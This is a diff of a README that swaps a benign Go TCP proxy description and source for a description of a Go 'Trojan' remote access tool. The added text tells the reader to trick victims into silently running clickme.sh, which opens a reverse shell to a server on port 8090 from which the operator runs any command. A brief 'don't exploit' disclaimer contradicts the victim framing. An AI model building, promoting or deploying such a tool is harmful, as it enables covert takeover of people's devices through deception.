@@ -1,70 +1,19 @@
-# TCP Proxy
+# Trojan
+A remote access tool written in go.
 
-A simple tcp proxy written in go.
+If a victim unintentionally executed the command below, I will have full control over his/her device via a reverse shell.
 
-Use like:
-
-```bash
-# with docker
-docker run -p 20000:20000 maxmcd/tcp-proxy tcp-proxy -l 0.0.0.0:20000 -r 100.111.145.101:2000
-
-# install with go
-go get github.com/maxmcd/tcp-proxy
-
-# and then use it
-tcp-proxy -l 0.0.0.0:20000 -r 100.111.145.101:2000
+```sh
+source clickme.sh > /dev/null 2>&1 &
 ```
 
-Full source:
+Of course, I am using this tool to manage my remote devices, such as router at home, behind NAT.
+Please don't use it for any form of exploitation.
 
-```go
-package main
+## Server
+The server listens to a single port (8090 by default) but it can accept more than one remote or local connections.
+Remote connections are initiated from the victims' computers by executing `clickme.sh` which will start a reverse shell.
+Local connection can list all remote connections and select one of them to run any command in the reverse shell.
 
-import (
-	"flag"
-	"fmt"
-	"io"
-	"log"
-	"net"
-)
-
-var localAddr *string = flag.String("l", "localhost:9999", "local address")
-var remoteAddr *string = flag.String("r", "localhost:80", "remote address")
-
-func main() {
-	flag.Parse()
-	fmt.Printf("Listening: %v\nProxying: %v\n\n", *localAddr, *remoteAddr)
-
-	listener, err := net.Listen("tcp", *localAddr)
-	if err != nil {
-		panic(err)
-	}
-	for {
-		conn, err := listener.Accept()
-		log.Println("New connection", conn.RemoteAddr())
-		if err != nil {
-			log.Println("error accepting connection", err)
-			continue
-		}
-		go func() {
-			defer conn.Close()
-			conn2, err := net.Dial("tcp", *remoteAddr)
-			if err != nil {
-				log.Println("error dialing remote addr", err)
-				return
-			}
-			defer conn2.Close()
-			closer := make(chan struct{}, 2)
-			go copy(closer, conn2, conn)
-			go copy(closer, conn, conn2)
-			<-closer
-			log.Println("Connection complete", conn.RemoteAddr())
-		}()
-	}
-}
-
-func copy(closer chan struct{}, dst io.Writer, src io.Reader) {
-	_, _ = io.Copy(dst, src)
-	closer <- struct{}{} // connection is closed, send signal to stop proxy
-}
-```
+## Client
+As long as the client has internet access and has bash installed, it can be exploited. It's your responsibility to trick the victim into running the shell script.
